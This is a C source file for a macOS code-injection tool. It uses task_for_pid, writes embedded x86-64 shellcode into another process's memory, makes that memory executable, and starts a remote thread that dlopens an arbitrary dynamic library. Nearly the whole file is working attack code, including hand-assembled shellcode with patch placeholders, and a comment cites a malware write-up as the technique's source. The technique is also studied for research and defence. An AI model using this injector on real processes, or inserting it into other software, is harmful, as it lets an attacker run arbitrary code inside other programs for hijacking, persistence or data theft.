//
//  main.c
//  code_inject
//
//  Created by linallen on 2020/1/8.
//  Copyright © 2020 linallen. All rights reserved.
//
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <dlfcn.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>


#define MACH_ERR(str,err) do { \
if(err != KERN_SUCCESS){ \
mach_error("[-]" str "\n",err); \
exit(EXIT_FAILURE); \
}\
}while(0)

#define STACK_SIZE   65536
#define CODE_SIZE   0x100
/*
 old thread inject:
 _pthread_set_self();                    // so dlopen works
 dlopen( dylib_name, 2 );                // 2 is global
 thread_suspend( mach_thread_self() )    // to prevent crashes
 
 
 so shellcode will like:
 #if defined(__x86_64__)
 unsigned char code[ 100 ] =
 "\x55"                                          // push %rbp
 "\x48\x89\xe5"                                  // mov %rbp, %rsp
 "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00"      // mov %rax, _pthread_set_self
 "\xff\xd0"                                      // call %rax
 "\x5d"                                          // pop %rbp
 "\x48\xbf\x00\x00\x00\x00\x00\x00\x00\x00"      // mov %rdi, dylib_address
 "\x48\xbe\x02\x00\x00\x00\x00\x00\x00\x00"      // mov %rsi, 2
 "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00"      // mov %rax, dlopen
 "\xff\xd0"                                      // call %rax
 "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00"      // mov %rax, mach_thread_self
 "\xff\xd0"                                      // call %rax
 "\x48\x89\xc7"                                  // mov %rdi, %rax
 "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00"      // mov %rax, thread_suspend
 "\xff\xd0"                                      // call %rax
 ;
 #endif
 
 before MAC OS X 10.14, _pthread_set_self(NULL), will initial current thread with a null thread , but > = 10.14 ,it failed.
 
 And pthread_create_from_mach_thread do it.  https://knight.sc/malware/2019/03/15/code-injection-on-macos.html
 
 
 getting a  null thread  is ideal in the injection case because we’re starting from a bare Mach thread with no pthread structures set up and no reference to any other thread.
 */

//uint64_t addr_pthread_set_self  = 0;
uint64_t addr_dlopen = 0;
uint64_t addr_sleep = 0;;
uint64_t addr_pthread_exit = 0;
uint64_t addr_pthread_create_from_mach_thread = 0;


/*pthread_create_from_mach_thread(pthread_t *thread, const pthread_attr_t *attr,void *(*start_routine)(void *), void *arg)*/
char injectCode[] =
// "\xCC"                            // int3

"\x55"                            // push       rbp
"\x48\x89\xE5"                    // mov        rbp, rsp
"\x48\x83\xEC\x10"                // sub        rsp, 0x10
"\x48\x8D\x7D\xF8"                // lea        rdi, qword [rbp+var_8]
"\x31\xC0"                        // xor        eax, eax
"\x89\xC1"                        // mov        ecx, eax
"\x48\x8D\x15\x21\x00\x00\x00"    // lea        rdx, qword ptr [rip + 0x21]
"\x48\x89\xCE"                    // mov        rsi, rcx
"\x48\xB8"                        // movabs     rax, pthread_create_from_mach_thread
"PTHRDCRT"
"\xFF\xD0"                        // call       rax
"\x89\x45\xF4"                    // mov        dword [rbp+var_C], eax
"\x48\x83\xC4\x10"                // add        rsp, 0x10
"\x5D"                            // pop        rbp
"\x48\xc7\xc0\x13\x0d\x00\x00"    // mov        rax, 0xD13
"\xEB\xFE"                        // jmp        0x0
"\xC3"                            // ret

"\x55"                            // push       rbp
"\x48\x89\xE5"                    // mov        rbp, rsp
"\x48\x83\xEC\x10"                // sub        rsp, 0x10
"\xBE\x01\x00\x00\x00"            // mov        esi, 0x1
"\x48\x89\x7D\xF8"                // mov        qword [rbp+var_8], rdi
"\x48\x8D\x3D\x1D\x00\x00\x00"    // lea        rdi, qword ptr [rip + 0x2c]
"\x48\xB8"                        // movabs     rax, dlopen
"DLOPEN__"
"\xFF\xD0"                        // call       rax
"\x31\xF6"                        // xor        esi, esi
"\x89\xF7"                        // mov        edi, esi
"\x48\x89\x45\xF0"                // mov        qword [rbp+var_10], rax
"\x48\x89\xF8"                    // mov        rax, rdi
"\x48\x83\xC4\x10"                // add        rsp, 0x10
"\x5D"                            // pop        rbp
"\xC3"                            // ret

"LIBLIBLIBLIB"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";



void SetRemoteThread(task_t task , vm_address_t remoteCode, vm_address_t remoteStack ){
    x86_thread_state64_t remoteThreadStat;
    thread_act_t  remoteThread ;
    memset(&remoteThreadStat, '\0' , sizeof(remoteThreadStat));
    
    remoteStack += STACK_SIZE/2;
    remoteThreadStat.__rip = (uint64_t) remoteCode;
    remoteThreadStat.__rsp = (uint64_t) remoteStack;
    remoteThreadStat.__rbp = (uint64_t) remoteStack;
    
    kern_return_t rc ;
    rc = thread_create_running(task , x86_THREAD_STATE64, &remoteThreadStat, x86_THREAD_STATE64_COUNT, &remoteThread);
    MACH_ERR("thread create running failed", rc);
    
    
    mach_msg_type_number_t thread_state_count =x86_THREAD_STATE64_COUNT;
    
    //waiy for remote thread to finish
    while(1){
        rc = thread_get_state(remoteThread, x86_THREAD_STATE64, &remoteThreadStat, &thread_state_count);
        MACH_ERR("Get remote thread state failed", rc);
        if(remoteThreadStat.__rax ==  0xD13){
            printf("[+] Remote thread finished\n");
            rc = thread_terminate(remoteThread);
            MACH_ERR("Remote thread terminate failed", rc);
            break;
        }
    }
}



int inject(pid_t pid,const char *lib)
{
    
    //Don't be cheat by task_t, it just is a port
    //typedef mach_port_t    task_t;
    task_t remoteTask ;
    
    FILE *fp =fopen(lib,"r");
    if(!fp){
        printf("gg\n");
        return -1;
    }
    
    kern_return_t rc;
    
    
    /* Maybe we need the entitlement -- "com.apple.system-task-ports" and "task_for_pid-allow" without root privilege*/
    
    rc = task_for_pid(mach_task_self_,pid , &remoteTask);
    MACH_ERR("Maybe your privilege is too low!\n",rc);
    
    mach_vm_address_t  remoteStack64 = (mach_vm_address_t)NULL ;
    mach_vm_address_t  remoteCode64 = (mach_vm_address_t)NULL ;
    
    // vm_map_t also is a port
    rc = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    MACH_ERR("Alloc stack failed",rc);
    
    
    rc = mach_vm_allocate(remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE);
    MACH_ERR("Alloc code failed",rc);
    
    // OS X PIE ???  dylib about system vm_address is changeless ; injecting code is more convenient;
    int i =0;
    
    char *possiblePatchLocation = injectCode;
    
    addr_pthread_create_from_mach_thread = dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
    addr_dlopen  = (uint64_t) dlopen ;
    
    
    for(i =0;i <0x100; i++){
        //extern void *_pthread_set_self;
        possiblePatchLocation ++;
        
        
        if(memcmp(possiblePatchLocation, "PTHRDCRT", 8)==0){
            memcpy(possiblePatchLocation, &addr_pthread_create_from_mach_thread, 8);
        }
        if(memcmp(possiblePatchLocation, "DLOPEN__", 8)==0){
            memcpy(possiblePatchLocation, &addr_dlopen, 8);
        }
        if(memcmp(possiblePatchLocation, "LIBLIBLIB", 9)==0){
            //memcpy(possiblePatchLocation, lib , sizeof(lib));
            strcpy(possiblePatchLocation, lib);
        }
    }
    
    printf("%d\n", sizeof(injectCode));
    rc = mach_vm_write(remoteTask, remoteCode64, (vm_address_t)injectCode, sizeof(injectCode));
    MACH_ERR("Inject code to remote thread failed",rc);
    
    
    rc = vm_protect(remoteTask, remoteCode64, sizeof(injectCode) ,false, VM_PROT_READ|VM_PROT_EXECUTE);
    MACH_ERR("Set Code mem privilege failed", rc);
    
    rc = vm_protect(remoteTask, remoteStack64, STACK_SIZE, true, VM_PROT_READ| VM_PROT_WRITE);
    MACH_ERR("Set stack mem privilege failed", rc);
    
    
    printf("0x%p 0x%p\n", remoteCode64,remoteStack64);
    
    SetRemoteThread(remoteTask,remoteCode64,remoteStack64);
    return 0 ;
}

int main(int argc, const char * argv[]) {
    
    //inject(162,"/Users/linallen/get-pip.py");
    if(argc <3){
        fprintf(stderr, "Usage: %s pid _dylib_path",argv[0]);
        exit(0);
    }
    pid_t pid = atoi(argv[1]);
    const char *lib = argv[2];
    inject(pid, lib);
    return 0;
}
